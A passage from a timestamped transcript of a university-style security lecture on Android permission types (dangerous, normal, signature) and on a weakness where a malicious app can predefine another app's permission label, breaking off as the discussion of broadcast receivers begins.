types in Android?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:17</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:17</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:20</time_slice>
              <text_slice>PROFESSOR: Yeah, I guess so.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:21</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:22</time_slice>
              <text_slice>So why not make everything
dangerous, I guess,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:23</time_slice>
              <text_slice>at that level?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:27</time_slice>
              <text_slice>Well, I guess, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:28</time_slice>
              <text_slice>So maybe the interesting
thing is like,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:29</time_slice>
              <text_slice>what are the semantics
of these types?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:30</time_slice>
              <text_slice>So if something is dangerous,
then you are right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:32</time_slice>
              <text_slice>It actually warns
the users when you're</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:34</time_slice>
              <text_slice>installing an application,
and the application</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:36</time_slice>
              <text_slice>asks for access to a particular
label that's of type Dangerous.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:39</time_slice>
              <text_slice>Then the user has to
look at this message</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:42</time_slice>
              <text_slice>and say, yes, I'm willing to
give this dangerous permission</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:45</time_slice>
              <text_slice>to this new application.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:47</time_slice>
              <text_slice>For normal-type labels,
applications can ask for them,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:51</time_slice>
              <text_slice>and the user
doesn't get prompted</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:53</time_slice>
              <text_slice>if the application requests
this normal type of permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:59</time_slice>
              <text_slice>Is this silly?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:01</time_slice>
              <text_slice>What's the point of a permission
if everyone just gets it?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:04</time_slice>
              <text_slice>Is there a reason why
we should have this?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:07</time_slice>
              <text_slice>Like, one example of a
normal permission in Android</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:09</time_slice>
              <text_slice>is setting your wallpaper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:10</time_slice>
              <text_slice>So if you have an
application that's</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:12</time_slice>
              <text_slice>going to set your wallpaper,
I can, as an application</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:14</time_slice>
              <text_slice>developer, say in
my manifest that I</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:16</time_slice>
              <text_slice>want to set your wallpaper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:18</time_slice>
              <text_slice>And if you click
Install, it's going</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:19</time_slice>
              <text_slice>to say, well, there's nothing
interesting going on here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:22</time_slice>
              <text_slice>You don't need to give
it any permissions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:24</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:24</time_slice>
              <text_slice>AUDIENCE: Well, these
permissions usually require you</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:26</time_slice>
              <text_slice>to [INAUDIBLE], right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:28</time_slice>
              <text_slice>So if an application wants to
change your desktop wallpaper,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:31</time_slice>
              <text_slice>it will ask you.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:33</time_slice>
              <text_slice>The system will ask you, do you
want to change your wallpaper?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:36</time_slice>
              <text_slice>PROFESSOR: Nope.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:36</time_slice>
              <text_slice>AUDIENCE: No?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:37</time_slice>
              <text_slice>PROFESSOR: No, it'll just
change the wallpaper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:39</time_slice>
              <text_slice>It's access to this API call
to change the wallpaper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:41</time_slice>
              <text_slice>If I have this permission,
I can make this API call.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:45</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:46</time_slice>
              <text_slice>AUDIENCE: Maybe the application
developer wants to make sure</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:49</time_slice>
              <text_slice>they don't do this accidentally?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:50</time_slice>
              <text_slice>PROFESSOR: Yes, I think that's
one reason why you might want</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:53</time_slice>
              <text_slice>to have these permissions,
is to help the application</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:55</time_slice>
              <text_slice>developer do the right thing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:57</time_slice>
              <text_slice>So if you worry that your
application might accidentally</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:01</time_slice>
              <text_slice>do something or it
might have bugs in it</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:02</time_slice>
              <text_slice>that others will
exploit, knowing</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:06</time_slice>
              <text_slice>that there's some
set of permissions</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:08</time_slice>
              <text_slice>that you do or don't have
prevents your application</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:11</time_slice>
              <text_slice>from being abused in these ways.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:13</time_slice>
              <text_slice>So if you have a
benign application that</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:15</time_slice>
              <text_slice>never needs to
set the wallpaper,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:16</time_slice>
              <text_slice>you probably don't want to
ask for this permission,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:19</time_slice>
              <text_slice>because if a VLAN
gets compromised,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:21</time_slice>
              <text_slice>then it will be
better for the user,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:23</time_slice>
              <text_slice>on whose phone your
application's installed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:26</time_slice>
              <text_slice>It's sort of a least
privilege property.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:29</time_slice>
              <text_slice>I guess another thing
is that it maybe</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:31</time_slice>
              <text_slice>allows some sort of auditing,
both from a developer</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:34</time_slice>
              <text_slice>standpoint, where
they can look and see,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:35</time_slice>
              <text_slice>well, what are the things I
should be concerned about here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:38</time_slice>
              <text_slice>And as well as from
a user's perspective.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:40</time_slice>
              <text_slice>If your phone is flickering
with a wallpaper change</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:43</time_slice>
              <text_slice>every second, you can go and
see who has this permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:46</time_slice>
              <text_slice>Even though I didn't
have to approve it,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:49</time_slice>
              <text_slice>I can at least go and
check who is potentially</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:51</time_slice>
              <text_slice>doing this right now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:54</time_slice>
              <text_slice>So these normal
permissions are kind of</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:56</time_slice>
              <text_slice>like a good security
measure-- or probably more</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:01</time_slice>
              <text_slice>of a good auditing measure.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:03</time_slice>
              <text_slice>And [? aren't ?] generally used
for really interesting things</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:06</time_slice>
              <text_slice>like [INAUDIBLE] data or
accessing things like cameras</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:11</time_slice>
              <text_slice>or things that cost money.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:14</time_slice>
              <text_slice>So there's also this third
thing, this signature</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:17</time_slice>
              <text_slice>permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:18</time_slice>
              <text_slice>So one interesting
thing in Android</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:20</time_slice>
              <text_slice>is that you can define
a permission that</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:22</time_slice>
              <text_slice>is only accessible to
applications that are signed</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:26</time_slice>
              <text_slice>with the same developer
key as the application that</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:30</time_slice>
              <text_slice>defined the permission
in the first place.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:33</time_slice>
              <text_slice>So if I have, I guess in
the FRIEND VIEW example</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:36</time_slice>
              <text_slice>in the paper, if the friend
tracker defined some permission</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:42</time_slice>
              <text_slice>with this signature type,
then only other applications</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:46</time_slice>
              <text_slice>signed by the same
developer key are</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:48</time_slice>
              <text_slice>going to be able to get
this signature permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:51</time_slice>
              <text_slice>What's the point of this thing?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:52</time_slice>
              <text_slice>Why not just make them
dangerous or, I don't know,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:56</time_slice>
              <text_slice>something else?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:57</time_slice>
              <text_slice>Why do we need a third type?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:01</time_slice>
              <text_slice>Any reason?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:01</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:02</time_slice>
              <text_slice>AUDIENCE: Operations
[INAUDIBLE] same developer?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:05</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:05</time_slice>
              <text_slice>So it might be that
this developer has</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:08</time_slice>
              <text_slice>some internal APIs that
they don't actually mean</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:11</time_slice>
              <text_slice>to expose to the outside world.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:13</time_slice>
              <text_slice>But they just want to couple
their own applications</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:16</time_slice>
              <text_slice>to each other.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:17</time_slice>
              <text_slice>So maybe Facebook,
hypothetically,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:20</time_slice>
              <text_slice>could write multiple
applications.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:22</time_slice>
              <text_slice>They might have one
application that's</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:24</time_slice>
              <text_slice>pre-fetching content
from Facebook servers,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:27</time_slice>
              <text_slice>another application that
fuses, another application that</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:29</time_slice>
              <text_slice>tracks your location.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:30</time_slice>
              <text_slice>And they want all
these components</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:32</time_slice>
              <text_slice>to interact with one another.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:33</time_slice>
              <text_slice>And they can define the
signature permission</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:35</time_slice>
              <text_slice>to do this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:37</time_slice>
              <text_slice>And presumably, one reason why
you might not want to do this--</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:40</time_slice>
              <text_slice>might not want to
tag this permission</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:43</time_slice>
              <text_slice>as a dangerous permission is
for mostly the same reasons</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:46</time_slice>
              <text_slice>as the [INAUDIBLE]
was talking about,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:49</time_slice>
              <text_slice>which is that if you really know
who should be allowed to get</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:52</time_slice>
              <text_slice>this permission, you don't
want to allow the user</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:55</time_slice>
              <text_slice>to screw this up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:56</time_slice>
              <text_slice>So the user could always
be tricked by someone--</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:59</time_slice>
              <text_slice>or could be tricked by
someone into accepting</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:02</time_slice>
              <text_slice>a malicious application that
asks for some permission that's</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:07</time_slice>
              <text_slice>really dangerous.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:07</time_slice>
              <text_slice>But [? it doesn't ?]
need to be dangerous,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:08</time_slice>
              <text_slice>you could just define
this signature.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:10</time_slice>
              <text_slice>And the user doesn't
even have a choice</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:12</time_slice>
              <text_slice>of giving away
some application's</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:14</time_slice>
              <text_slice>internal privileges.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:15</time_slice>
              <text_slice>That's one nice thing
about this permission type.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:20</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:23</time_slice>
              <text_slice>So there's other
stuff associated</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:24</time_slice>
              <text_slice>with the label that mostly
has to do with describing</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:29</time_slice>
              <text_slice>the permission to the user.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:30</time_slice>
              <text_slice>So there's some sort
of a description here</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:34</time_slice>
              <text_slice>that is the sort of
English-level explanation</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:38</time_slice>
              <text_slice>of what this permission entails.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:40</time_slice>
              <text_slice>And it's this
description that pops up</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:43</time_slice>
              <text_slice>when you're asked to
install a new application.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:45</time_slice>
              <text_slice>So the Android framework will
look through all the label</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:49</time_slice>
              <text_slice>strings in the manifest
of the application you're</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:51</time_slice>
              <text_slice>about to install, and display
to the user the descriptions</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:55</time_slice>
              <text_slice>for all those labeled
strings, saying, OK,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:57</time_slice>
              <text_slice>you're about to give away the
privileges to dial your phone,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:00</time_slice>
              <text_slice>or you're about to give this
application the permission</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:02</time_slice>
              <text_slice>to send SMS messages on
your behalf, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:06</time_slice>
              <text_slice>That make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:09</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:10</time_slice>
              <text_slice>So one interesting
question is, what</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:15</time_slice>
              <text_slice>happens if a malicious
application defines</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:18</time_slice>
              <text_slice>a label for some other app?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:22</time_slice>
              <text_slice>These labels are just
free-form strings.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:26</time_slice>
              <text_slice>So what happens if you're
a malicious application</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:28</time_slice>
              <text_slice>and you say, oh, I have
this new, great permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:31</time_slice>
              <text_slice>It's called DIAL PERM.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:32</time_slice>
              <text_slice>And [INAUDIBLE] dangerous.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:33</time_slice>
              <text_slice>And the description
does nothing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:37</time_slice>
              <text_slice>Is it good or [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:39</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:40</time_slice>
              <text_slice>AUDIENCE: So [INAUDIBLE]
domains [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:47</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:48</time_slice>
              <text_slice>So you hope so.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:50</time_slice>
              <text_slice>Unfortunately, it's
not actually enforced.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:52</time_slice>
              <text_slice>So by convention, all
these permission strings</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:56</time_slice>
              <text_slice>should have Java-style
reversed domain names.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:59</time_slice>
              <text_slice>But there's no
strict association</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:02</time_slice>
              <text_slice>between the labels that
an application defines</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:06</time_slice>
              <text_slice>and the application's
own Java-style name.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:09</time_slice>
              <text_slice>And for that matter,
there's nothing</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:10</time_slice>
              <text_slice>that enforces that an
application's Java-style name</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:13</time_slice>
              <text_slice>be tied to anything, because
we have no way of knowing</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:16</time_slice>
              <text_slice>whether the public
[INAUDIBLE] developer signing</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:19</time_slice>
              <text_slice>a particular
application corresponds</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:21</time_slice>
              <text_slice>to com.google.something
or edu.mit.something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:25</time_slice>
              <text_slice>So in fact, one slight
weakness in Android</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:28</time_slice>
              <text_slice>that was there at least when
I checked a while ago-- it</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:32</time_slice>
              <text_slice>probably is still there-- is
that the label definitions are</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:36</time_slice>
              <text_slice>sort of first
come, first served.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:37</time_slice>
              <text_slice>So when you first
install an application,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:39</time_slice>
              <text_slice>it defines a
particular label, you</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:41</time_slice>
              <text_slice>get to decide what type
that label string is</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:44</time_slice>
              <text_slice>and what is the description
of this label string.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:47</time_slice>
              <text_slice>So for system permissions, this
is probably not a big problem,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:51</time_slice>
              <text_slice>because the system
permissions, or the ones</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:54</time_slice>
              <text_slice>for built-in applications
like [? compiler, ?]</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:56</time_slice>
              <text_slice>get defined first.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:58</time_slice>
              <text_slice>But applications that come later
are unable to redefine them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:01</time_slice>
              <text_slice>So at least the
framework enforces that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:04</time_slice>
              <text_slice>But certainly, one bummer
is that if you install</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:07</time_slice>
              <text_slice>a malicious application
first and then</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:08</time_slice>
              <text_slice>some important
application later,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:11</time_slice>
              <text_slice>the malicious application
can potentially</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:13</time_slice>
              <text_slice>subvert the labels used by
the later well-meaning app.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:17</time_slice>
              <text_slice>So in the paper's
FRIEND VIEWER example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:20</time_slice>
              <text_slice>you could actually-- if you're
a malicious developer, you could</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:23</time_slice>
              <text_slice>first trick the
user into installing</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:26</time_slice>
              <text_slice>these applications defines
this FRIEND [? VIEW ?]</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:28</time_slice>
              <text_slice>permission to be a normal
permission with a description</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:31</time_slice>
              <text_slice>stream saying, oh, this does
nothing interesting at all.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:34</time_slice>
              <text_slice>And then the FRIEND VIEWER
applet gets installed later.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:37</time_slice>
              <text_slice>It can't redefine this label.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:39</time_slice>
              <text_slice>It's already been defined.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:40</time_slice>
              <text_slice>And consequently might
be unable to prevent</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:46</time_slice>
              <text_slice>the user from giving
away this FRIEND VIEW</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:48</time_slice>
              <text_slice>permission to other apps.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:50</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:52</time_slice>
              <text_slice>PROFESSOR: Well, in principle,
the framework could do this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:55</time_slice>
              <text_slice>When I tried this, you
don't get warned at all.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:57</time_slice>
              <text_slice>So if you install
an application that</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:00</time_slice>
              <text_slice>defines a label that's already
been defined, it does nothing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:04</time_slice>
              <text_slice>It simply ignores the
VIEW label definition</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:07</time_slice>
              <text_slice>and uses the old one.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:09</time_slice>
              <text_slice>Perhaps that's the problem
where it really goes wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:11</time_slice>
              <text_slice>You should at least
say, well, I refuse</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:13</time_slice>
              <text_slice>to install this application,
because it's defining</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:15</time_slice>
              <text_slice>a label that already exists.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:16</time_slice>
              <text_slice>AUDIENCE: Owned by
this other application.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:18</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:19</time_slice>
              <text_slice>And it's owned by a
different key even.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:21</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:21</time_slice>
              <text_slice>So at least there's a chance
to fix this potentially.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:24</time_slice>
              <text_slice>I haven't seen this
fixed yet, but maybe I've</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:27</time_slice>
              <text_slice>not been keeping track of it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:30</time_slice>
              <text_slice>Anyway.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:30</time_slice>
              <text_slice>So that's kind of an
interesting problem</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:32</time_slice>
              <text_slice>that you really have to
keep track of these names</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:34</time_slice>
              <text_slice>and figure out who owns a
name and getting that right</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:39</time_slice>
              <text_slice>is actually quite important.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:41</time_slice>
              <text_slice>So one interesting problem
that shows up in Android</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:45</time_slice>
              <text_slice>has to do with these broadcast
receivers or sort of sending</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:48</time_slice>
              <text_slice>messages between applications.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:51</time_slice>
              <text_slice>So one interesting problem is
when you're sending-- well,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:54</time_slice>
              <text_slice>I guess I should first describe
how these messages work</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:56</time_slice>
              <text_slice>with broadcast receivers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:58</time_slice>
              <text_slice>So broadcast receivers are
used for one application</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:02</time_slice>
              <text_slice>being able to
announce some event</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:04</time_slice>
              <text_slice>to every other
application in the system.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:07</time_slice>
              <text_slice>So as we saw before,
intents typically</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:09</time_slice>
              <text_slice>go to a particular component,
like view a JPEG image.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:12</time_slice>
              <text_slice>But for some events,
like, the system boots up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:16</time_slice>
              <text_slice>Or my friends are nearby.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:18</time_slice>
              <text_slice>You might want to announce
this to every application that</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:21</time_slice>
              <text_slice>cares.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:22</time_slice>
              <text_slice>And this is what these
broadcast receivers are for.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:25</time_slice>
              <text_slice>But you actually
start worrying when</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:28</time_slice>
              <text_slice>you have these messages being
sent between two applications,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:31</time_slice>
              <text_slice>both in the broadcast receiver
case and in other cases,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:34</time_slice>
              <text_slice>you probably care
about two things.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:36</time_slice>
              <text_slice>You might want to
authenticate where</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:38</time_slice>
              <text_slice>the message is coming from.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:39</time_slice>
              <text_slice>So you want to know
who sent this message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:41</time_slice>
              <text_slice>Can I trust them?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:42</time_slice>
              <text_slice>And also, you want to
potentially control</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:44</time_slice>
              <text_slice>where this message
goes to-- who is</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:45</time_slice>
              <text_slice>able to receive this message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:48</time_slice>
              <text_slice>And initially, it seems like
an Android device didn't quite</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:51</time_slice>
              <text_slice>get these things quite
correctly in several ways.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:56</time_slice>
              <text_slice>In particular, the
broadcast receivers--</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:03</time_slice>
              <text_slice>well, if you are sending
a broadcast message</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:07</time_slice>
              <text_slice>to all the other
components in your system,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:11</time_slice>
              <text_slice>I think in the initial
version of Android,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:13</time_slice>
